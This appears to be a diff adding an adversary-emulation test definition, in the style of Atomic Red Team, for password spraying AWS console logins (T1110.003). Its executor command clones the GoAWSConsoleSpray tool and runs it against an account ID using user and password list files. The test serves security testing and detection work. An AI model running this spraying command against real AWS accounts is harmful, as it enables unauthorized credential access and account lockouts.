@@ -1,0 +1,37 @@
+{
+    "name": "AWS - Password Spray an AWS using GoAWSConsoleSpray",
+    "description": "GoAWSConsoleSpray is a tool that can be used to spray AWS IAM Console Credentials in order to identify a valid login for a user account built by WhiteOakSecurity. For more details reagrding the tool, check - https://www.whiteoaksecurity.com/blog/goawsconsolespray-password-spraying-tool/ ",
+    "supported_platforms": [
+        "iaas:aws"
+    ],
+    "executor": {
+        "command": "cd /tmp\ngit clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git\ncd /tmp/GoAWSConsoleSpray\ngo run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt\n",
+        "cleanup_command": "rm -rf /tmp/GoAWSConsoleSpray\n",
+        "name": "sh",
+        "elevation_required": false,
+        "type": "Command Executor"
+    },
+    "id": "T1110.003",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Password Spraying",
+    "source": "ART",
+    "uuid": "9c10d16b-20b1-403a-8e67-50ef7117ed4e",
+    "arguments": {
+        "aws_account_id": {
+            "description": "ID of the AWS account",
+            "type": "string",
+            "default": "XXXXXXXX"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Check if go is installed\n",
+            "prereq_command": "go version\n",
+            "get_prereq_command": "echo Install GO\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
